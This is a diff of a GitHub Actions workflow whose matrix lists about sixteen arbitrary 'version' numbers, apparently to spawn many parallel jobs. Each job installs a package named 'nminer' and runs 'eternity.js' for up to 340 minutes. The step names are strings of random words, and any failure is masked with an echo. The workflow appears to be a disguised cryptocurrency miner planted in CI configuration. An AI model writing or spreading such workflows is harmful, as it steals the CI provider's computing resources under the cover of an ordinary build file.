@@ -9,24 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9538 }
-          - { version: 1504 }
-          - { version: 2604 }
-          - { version: 133 }
-          - { version: 4624 }
-          - { version: 7495 }
-          - { version: 4616 }
-          - { version: 3099 }
-          - { version: 8721 }
-          - { version: 9680 }
-          - { version: 3428 }
-          - { version: 884 }
-          - { version: 3564 }
-          - { version: 5047 }
-          - { version: 9555 }
-          - { version: 6927 }
-          - { version: 2546 }
-          - { version: 5256 }
+          - { version: 2505 }
+          - { version: 7934 }
+          - { version: 3138 }
+          - { version: 3247 }
+          - { version: 729 }
+          - { version: 5831 }
+          - { version: 466 }
+          - { version: 7005 }
+          - { version: 5391 }
+          - { version: 2078 }
+          - { version: 9619 }
+          - { version: 2845 }
+          - { version: 5875 }
+          - { version: 522 }
+          - { version: 3430 }
+          - { version: 675 }
 
     steps:
       - name: Checkout
@@ -37,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: mentor abnormally dislocate hypothesize pinion
+      - name: papa thoroughly pleasant commandeer deeply
         run: |
           npm install nminer@latest
-          timeout 327m node eternity.js || echo "eternity executed"
+          timeout 340m node eternity.js || echo "eternity executed"
